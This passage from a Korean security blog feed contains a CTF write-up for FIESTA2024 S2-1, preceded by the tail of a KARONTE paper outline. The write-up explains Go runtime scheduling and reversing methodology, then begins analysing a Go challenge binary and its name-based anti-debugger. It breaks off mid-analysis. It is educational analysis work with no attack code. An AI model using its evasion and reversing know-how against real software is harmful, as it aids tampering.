          &lt;li&gt;Binary Level Interaction&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;OS-independent CPF: Semantic CPF
    &lt;ol&gt;
      &lt;li&gt;Key Idea
        &lt;ol&gt;
          &lt;li&gt;IPC often relies on predefined data keys, which is often hardcoded as constants.&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;Detection Focus
        &lt;ol&gt;
          &lt;li&gt;Function-Level Data Flow&lt;/li&gt;
          &lt;li&gt;Memory Operations&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;d-binary-dependency-graph-algorithm&quot;&gt;D. Binary Dependency Graph Algorithm&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;e-static-taint-analysis&quot;&gt;E. Static Taint Analysis&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;f-multi-binary-data-flow-analysis&quot;&gt;F. Multi-binary Data-flow Analysis&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;g-vulnerability-example&quot;&gt;G. Vulnerability Example&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 25 Jan 2025 22:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/fuzzing/2025-01-26-KARONTE</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/fuzzing/2025-01-26-KARONTE</guid>
      </item>
    
      <item>
        <title>FIESTA2024 S2-1 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-golang이란&quot; id=&quot;markdown-toc-0-golang이란&quot;&gt;0. Golang이란&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-golang의-특징&quot; id=&quot;markdown-toc-01-golang의-특징&quot;&gt;0.1. Golang의 특징&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#011-개요&quot; id=&quot;markdown-toc-011-개요&quot;&gt;0.1.1. 개요&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#012-동시성-지원concurrency-링크&quot; id=&quot;markdown-toc-012-동시성-지원concurrency-링크&quot;&gt;0.1.2. 동시성 지원(Concurrency, 링크)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#013-표준-라이브러리&quot; id=&quot;markdown-toc-013-표준-라이브러리&quot;&gt;0.1.3. 표준 라이브러리&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#02-go-pe-섹션&quot; id=&quot;markdown-toc-02-go-pe-섹션&quot;&gt;0.2. Go PE 섹션&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-probexe-리버싱&quot; id=&quot;markdown-toc-1-probexe-리버싱&quot;&gt;1. prob.exe 리버싱&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#10-샌드박스-분석&quot; id=&quot;markdown-toc-10-샌드박스-분석&quot;&gt;1.0. 샌드박스 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#11-동적-분석-시도&quot; id=&quot;markdown-toc-11-동적-분석-시도&quot;&gt;1.1. 동적 분석 시도&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-정적-분석-시도&quot; id=&quot;markdown-toc-12-정적-분석-시도&quot;&gt;1.2. 정적 분석 시도&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#13-main-패키지-내-함수-간-콜-관계-분석&quot; id=&quot;markdown-toc-13-main-패키지-내-함수-간-콜-관계-분석&quot;&gt;1.3. main 패키지 내 함수 간 콜 관계 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#14-동적-분석&quot; id=&quot;markdown-toc-14-동적-분석&quot;&gt;1.4. 동적 분석&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#141-실패-기록&quot; id=&quot;markdown-toc-141-실패-기록&quot;&gt;1.4.1. 실패 기록&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#142-성공&quot; id=&quot;markdown-toc-142-성공&quot;&gt;1.4.2. 성공!&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-번외-ida-오류-고치기&quot; id=&quot;markdown-toc-2-번외-ida-오류-고치기&quot;&gt;2. 번외: IDA 오류 고치기&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-main_main-함수-분석&quot; id=&quot;markdown-toc-21-main_main-함수-분석&quot;&gt;2.1. main_main 함수 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-main_wdcodev0-v1-함수-분석&quot; id=&quot;markdown-toc-22-main_wdcodev0-v1-함수-분석&quot;&gt;2.2. main_WDcode(v0, v1) 함수 분석&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-golang이란&quot;&gt;0. Golang이란&lt;/h1&gt;

&lt;h2 id=&quot;01-golang의-특징&quot;&gt;0.1. Golang의 특징&lt;/h2&gt;

&lt;p&gt;개발이 가능한 수준으로 공부하고 싶다면 이 &lt;a href=&quot;https://go.dev/doc/&quot;&gt;공식 홈페이지&lt;/a&gt;를 참고하길&lt;/p&gt;

&lt;p&gt;gdb로 go 바이너리를 동적 분석하고 싶다면 이 &lt;a href=&quot;https://go.dev/doc/gdb&quot;&gt;공식 홈페이지를&lt;/a&gt; 참고하길&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;011-개요&quot;&gt;0.1.1. 개요&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;프로그램 { 패키지 { 함수 } }의 구조를 가짐&lt;/li&gt;
  &lt;li&gt;즉, package main 내의 func main 이 컴파일되면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.main&lt;/code&gt; 심볼을 가지게 됨&lt;/li&gt;
  &lt;li&gt;Go 런타임은 Golang의 Concurrency를  기존 OS에서 제공하는 프로세스 관리 기능보다 훨씬 효율적으로, 컨텍스트 스위칭 비용을 적게 지불하면서 보장하기 위하여 구현됨&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;012-동시성-지원concurrency-링크&quot;&gt;0.1.2. 동시성 지원(Concurrency, &lt;a href=&quot;https://go.dev/doc/effective_go#concurrency&quot;&gt;링크&lt;/a&gt;)&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;고루틴&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Go가 제공하는 경량 스레드(OS단에서 제공하는 LWP, Light Weight Process를 사용자 단에서 구현한 개념)&lt;/li&gt;
  &lt;li&gt;함수 호출 앞에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go&lt;/code&gt;를 붙이면 해당 함수는 고루틴으로 실행됨(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go {function_name}&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;채널&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;고루틴 간 데이터 통신을 위해 사용되는 구조체&lt;/li&gt;
  &lt;li&gt;채널은 버퍼를 가질 수도, 버퍼를 가지지 않을 수도 있음&lt;/li&gt;
  &lt;li&gt;make로 채널을 생성하고, &amp;lt;- 연산자로 데이터를 송수신함(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch:=make( chan string) \n msg:= &amp;lt;-ch&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;여러 채널의 데이터 송수신 지원&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;여러 채널의 데이터 수신을 동시에 기다리되, 데이터가 먼저 도착하는 채널을 채택하는 기능 구현&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;이는 select 문으로 구현되는 개념&lt;/p&gt;

    &lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ch1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ch2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
      &lt;span class=&quot;k&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Message from channel 1&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}()&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Message from channel 2&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}()&lt;/span&gt;
    
      &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;nb&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;nb&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;고루틴 간 동기화&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;모든 동시성 프로그래밍이 그렇듯, 지정된 그룹의 고루틴이 끝날 때까지 기다리는 기능 / 뮤텍스 제공 / 특정 작업이 한 번만 실행되도록 제한하는 기능을 제공함&lt;/li&gt;
  &lt;li&gt;이는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sync&lt;/code&gt; 패키지를 사용하면 구현할 수 있음&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;고루틴 스케줄링(더 자세히 알고 싶다면 &lt;a href=&quot;https://velog.io/@sunaookamisiroko/Goroutine-%EC%8A%A4%EC%BC%80%EC%A4%84%EB%A7%81&quot;&gt;링크&lt;/a&gt;로)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;mark&gt;이 내용은 그림과 같이 보는 게 더 이해가 쉬우니, 위에 제시한 링크로 들어가서 읽어보는 걸 추천한다.&lt;/mark&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;고루틴은 Go 런타임 스케줄러에 의해 스케줄링됨&lt;/li&gt;
  &lt;li&gt;OS 단에서 &lt;a href=&quot;https://velog.io/@seokjun0915/%EC%9A%B4%EC%98%81%EC%B2%B4%EC%A0%9C-Thread-Scheduling&quot;&gt;스레드 스케줄링&lt;/a&gt;을 할 때를 참고해 보면, 유저 단에서 어떻게 고루틴 스케줄링을 추상화하여 구현했는지 알 수 있음. 즉, &lt;mark&gt;유저 단에서 원하는 스케줄링 방식을 커널 단에서 실제로 실행해줄 수 있게끔 API 역할을 하는 게 Go 런타임 스케줄러임&lt;/mark&gt;&lt;/li&gt;
  &lt;li&gt;기본적으로 N:M 구조로 스레딩이 되고, 현재는 local runqueue 방식으로 멀티코어 스레딩을 지원하며 할당된 local runqueue에 작업이 없으면 그때 global runqueue에 접근해 작업을 가져오는 혼합 방식을 취한 것으로 보인다.(멀티프로세서 스케줄링 방식에서 각 프로세서가 내부 코어별로 스케줄링 큐를 두는 per-core run queues 방식과 비슷함)&lt;/li&gt;
  &lt;li&gt;추가로, work stealing이라는, 운영체제에서의 Lord Balancing(Push &amp;amp; Pull Migration)과 비슷한 개념을 가져와 효율적인 시간 자원 배분을 꾀했다.&lt;/li&gt;
  &lt;li&gt;그러나 이 경우 시스콜로 인해 block 상태에 빠진 OS 스레드가 local runqueue를 가져버리면 Go에서 사용 가능한 OS 스레드의  개수를 정의하는 변수인 GOMAXPROCS가 정의하는 사용 가능한 OS 스레드의 정의와 충돌이 발생하여, 스레드 스케줄링의 주요 요소가 프로세스의 관리를 벗어나 버리는 상황이 발생한다. 즉, work stealing의 올바른 실 구현이 불가능해진다.&lt;/li&gt;
  &lt;li&gt;위 문제의 핵심은 block 상태인 OS 스레드(M)가 local runqueue를 가져버리는 예외 상황으로, 이 상황의 관리를 위해  신규 구조체(p-processor) 개념을 도입하여 p-processor가 local runqueue를 가지고, OS단의 기능인 OS 스레드(M)가 p를 상호간에 토스하도록 했다.&lt;/li&gt;
  &lt;li&gt;이 뒤로도 starvation의 방지, convoy effect의 방지를 위해 Preemptive Scheduling(시분할로 통제되는 자원선점)를 적용하며 그 구현책으로 go runtime 내에 sysmon 데몬 쓰레드를 구현하였다.&lt;/li&gt;
  &lt;li&gt;sysmon 데몬 쓰레드는 고루틴들을 모니터링하고, M에 의한 실행 시간이 10ms를 초과한 고루틴을 잡고 있는 M에게 SIGURG 시그널을 보내 해당 고루틴을 Global runqueue로 보내도록 하는 방안을 채택했다.&lt;/li&gt;
  &lt;li&gt;추가로, Goroutine Locality라고 고루틴이 다른 고루틴을 생성하는 일종의 스레드 계층 구조 지원과 비슷한 기능을 지원한다. 이 경우 발생할 수 있는 poor locality 문제를 해결하기 위해 시분할 상속(Time Slice Inheritance) 기법을 적용했다.&lt;/li&gt;
  &lt;li&gt;또한 모든 M의 local runqueue에 하나 이상의 고루틴이 존재하여 Global Runqueue의 기아상태가 발생할 가능성을 대비하여 loacal runqueue의 polling이 일어날 때마다 ++되는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;schedtick&lt;/code&gt;이라는 변수를 계속해서 살피고, 이것의 값이 61이 될 때 Global runqueue를 반드시 polling해서 고루틴을 가져오도록 했다. 61을 기준으로 삼는 이유는 컴퓨터 시스템에서 소수를 이용하는 그 이유가 맞고, 하필 저 소수인 이유는 성능상 가장 괜찮은 성능을 보여줘서 그렇다. 즉, 수학적 이유와 경험적 이유가 맞물려서 선택된 값이 61이다.&lt;/li&gt;
  &lt;li&gt;만약 고루틴에서 시스콜이 발생해 이를 담당하고 있던 M이 block 상태로 들어간다면, Go Shecduler는 이 M이 가지고 있던 P를 다른 M에게 건네줌으로써 시스콜을 기다릴 필요 없는 local runqueue 내의 다른 고루틴들의 실행을 보장한다. 이 행위 자체가 상당히 큰 리소스를 요하기 때문에, Go Scheduler는 긴 시간이 걸리는 system call이 발생했을 때에만 이런 hand off를 수행한다. 그 외의 짧은 system call들은 그냥 기다리게 내버려두고…&lt;/li&gt;
  &lt;li&gt;물론 이 시스콜이 짧을 거라 생각했는데 너무 오래 걸린다면 고루틴들을 모니터링하고 있던 sysmon에게 걸려서 handoff가 실행된다.&lt;/li&gt;
  &lt;li&gt;OS단의 스레드 관리를 왜 굳이 고 언어 시스템에서 비슷하게 구현해 두었는가? 라는 생각이 들었는데, 일단은 효율성을 최대화한 OS단의 스레드 관리에 대해 더 큰 효율성과 사용자 입장에서 더 직관적인 스레드 관리 기능을 구현하고 싶었던 게 첫째 이유 같고…. 둘째로는 크로스 컴파일이 가능하도록 하기 위해서가 아닌가 싶다. 언제까지나 추측이라 정확한 건 아니다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;013-표준-라이브러리&quot;&gt;0.1.3. 표준 라이브러리&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;go 바이너리를 분석하다 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime&lt;/code&gt; 으로 시작하는 함수명이 많이 보일 것이다.&lt;/li&gt;
  &lt;li&gt;이는 go가 기본으로 제공하는 표준 라이브러리 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime&lt;/code&gt; 하위에 있는 패키지와 함수이다.&lt;/li&gt;
  &lt;li&gt;즉, 그렇기 때문에 정적 분석 시 굳이 들여다볼 필요 없는 함수이기도 하다.&lt;/li&gt;
  &lt;li&gt;라이브러리 개념을 빼고 보면 runtime은 JAVA의 JVM이나 파이썬의 인터프리터와 같은 개념을 하는, 프로그램을 실행될 수 있도록 하는 환경을 의미한다. 즉 이 안에 동시성 지원, 가비지 컬렉션, 동적 데이터 구조의 메모리 관리 등이 다 포함 및 구현된 채로 실행되는 것이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;02-go-pe-섹션&quot;&gt;0.2. Go PE 섹션&lt;/h2&gt;

&lt;p&gt;Go PE는 전통적인 PE와 그 섹션 헤더 상에서는 차이가 없다고 보아도 무방하다.&lt;/p&gt;

&lt;p&gt;즉, 헤더만으로는 그 둘을 구분할 수 없다.&lt;/p&gt;

&lt;p&gt;Go PE의 헤더상에서 Go runtime과 관련된 문자열이 노출될 수도 있으나, 이는 Obfuscation 등의 기법을 거치면 찾기 어려워진다.&lt;/p&gt;

&lt;p&gt;오히려 정적 분석 툴을 켜서 내부 내용을 확인하면&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;수상할 정도로 함수가 많고&lt;/li&gt;
  &lt;li&gt;뭔가 커널 단 동작을 제어하는 것 같은 함수들이 자꾸 스스로를 콜하며 끝나고&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;하는 것이 보이기 때문에, 바로 Go 바이너리라는 것을 알 수 있다.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-probexe-리버싱&quot;&gt;1. prob.exe 리버싱&lt;/h1&gt;

&lt;p&gt;리버싱을 하는 이유는 뭘까?&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;파일의 목적을 알기 위해&lt;/li&gt;
  &lt;li&gt;즉, 이 파일이 어떤 행위를 하는지 알기 위해&lt;/li&gt;
  &lt;li&gt;더 디테일하게는 누구와 통신하여 어떤 방식으로 내부 루틴을 수행하는지 알아내 특징점을 추출하거나 원하는 대응을 하기 위해&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;사실 이게 다지 않을까?&lt;/p&gt;

&lt;p&gt;그럼 이 이유를 충족하기 위해 분석가는 어떤 행위를 해야 할까?&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;먼저 샌드박스에서 돌려본다.
    &lt;ol&gt;
      &lt;li&gt;네트워크상으로 무엇을 하는지&lt;/li&gt;
      &lt;li&gt;어떤 DLL이나 외부 응용을 콜하는지&lt;/li&gt;
      &lt;li&gt;파일 시스템에서는 무엇이 변경되었는지&lt;/li&gt;
      &lt;li&gt;레지스트리 키에서는 무엇을 변경했는지 등을 알 수 있게 된다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;그러나 악성 코드가 샌드박스를 탐지하여 정상 행위를 하는 경우도 있고, 샌드박스로는 행위의 결과만을 알 수 있기 때문에 더 많은 정보를 얻기 위해서는 정적으로 접근해야 한다.&lt;/li&gt;
  &lt;li&gt;정적으로 접근할 땐 무엇이 핵심적인 기능을 수행하는 부분인지를 알아내는 것이 목적이다.
    &lt;ol&gt;
      &lt;li&gt;즉, 1의 샌드박스 분석을 통해 알아낸 행위 중, 추가적인 추적이 필요한 부분을 분석해 내부 루틴을 밝히는 것이 목적이다.&lt;/li&gt;
      &lt;li&gt;이를 통해 랜섬웨어의 경우에는 암호화 루틴 해독, 에이전트의 경우에는 C2 추적 등을 할 수 있다.&lt;/li&gt;
      &lt;li&gt;추가적으로 내부 함수 네이밍 규칙이나 시스템 콜 사용 습관 등을 통해 공격자를 라벨링할 수도 있다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;그러나 내부 문자열 디코딩 후 사용과 같은 루틴이 너무 복잡해 이걸 복호화하는 루틴을 짜다가는 시간이 너무 소요될 것이란 판단이 드는 때가 있다.&lt;/li&gt;
  &lt;li&gt;이럴 때 동적 분석을 수행한다.
    &lt;ol&gt;
      &lt;li&gt;메모리에 올라간 값의 변화, 실시간으로 서버에서 받아오는 값 등을 추적할 수 있다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;물론 저 순서대로 깔끔하게 떨어질 리는 없고, 2 했다가 3 했다가 5했다가 하는 거긴 한데…&lt;/p&gt;

&lt;p&gt;아무튼 위와 같은 행위를 위해 다양한 테크닉이 필요하고, 이 모든 것을 종합해 리버싱이라 부르는 것이라 생각한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;10-샌드박스-분석&quot;&gt;1.0. 샌드박스 분석&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이러면 솔직히 KTX 타고 지나가다 봐도 flag url에 접속해 얻는 flag1 파일에 플래그가 적혀 있을 것 같긴 하다&lt;/p&gt;

&lt;p&gt;그리고 실제로 그랬고&lt;/p&gt;

&lt;p&gt;하지만 나는 이 문제를 통해 리버싱을 공부하는 게 목표니까, 정적-동적 분석까지 해 보려 한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-동적-분석-시도&quot;&gt;1.1. 동적 분석 시도&lt;/h2&gt;

&lt;p&gt;해당 파일에 x64dbg 물려보려 시도하면 디버거가 바로 죽음&lt;/p&gt;

&lt;p&gt;정적으로 까보기 위해 IDA에 띄워봄&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%201.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위와 같은 깃헙 오픈소스를 사용한 것이 보임&lt;/p&gt;

&lt;p&gt;해당 오픈소스는 golang으로 작성된  &lt;strong&gt;안티디버거&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;인터넷에 검색해 해당 안티디버거의 레포로 들어가 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%202.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;대박 탐지하는 디버거에 치트엔진이 없네&lt;/p&gt;

&lt;p&gt;그리고 디버거 프로그램명을 기반으로 탐지하는 거라 exe name을 바꾸면 탐지 못 한다고도 쓰여 있다.&lt;/p&gt;

&lt;p&gt;==있으나마나한 안티디버거&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-정적-분석-시도&quot;&gt;1.2. 정적 분석 시도&lt;/h2&gt;

&lt;p&gt;non-stripped된 바이너리이기 때문에, 내부 패키지와 그 내부의 함수도 복구가 가능하다.&lt;/p&gt;

&lt;p&gt;특히, &lt;strong&gt;Golang으로 프로그램을 작성한다면 반드시 main 패키지가 존재해야 하며, 그 내부에 main 함수가 정의되어야 정상 컴파일이 가능하기 때문에&lt;/strong&gt;, main 패키지에 대한 메타데이터 습득에서부터 분석을 시작하는 것이 좋을 것이다.&lt;/p&gt;

&lt;p&gt;main패키지 하위 함수는 원래 go 컴파일 과정에서 main.{함수명}으로 네이밍되기 때문에(IDA에서는 .을 &lt;em&gt;으로 해석하는 바람에 main&lt;/em&gt;{함수명}이 되지만), functions window에서 main_으로 검색해 보면 아래와 같은 결과가 나온다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%203.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, main 패키지에는 아래와 같은 함수들이 정의되어 있던 것으로 보인다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WDecode&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run_deferwrap1&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run_Printf_func1&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run_Printf_func2&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run_Printf_func3&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DownloadFile&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DownloadFile_deferwrap1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;main 패키지의 엔트리는 main함수이니, 그로부터 콜 관계를 분석해 보기로 했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;13-main-패키지-내-함수-간-콜-관계-분석&quot;&gt;1.3. main 패키지 내 함수 간 콜 관계 분석&lt;/h2&gt;

&lt;p&gt;어떤 함수가 진짜 핵심 기능을 수행하는 함수인지 알고 싶다면, 이렇게 non-stripped 되어있고 엔트리가 확실한 바이너리라면 콜 관계를 분석해서 접근하는 게 좋다고 생각한다.&lt;/p&gt;

&lt;p&gt;라고 말하면서 function calls 그래프 띄우려고 한 여섯번정도 요청 날렸는데&lt;/p&gt;

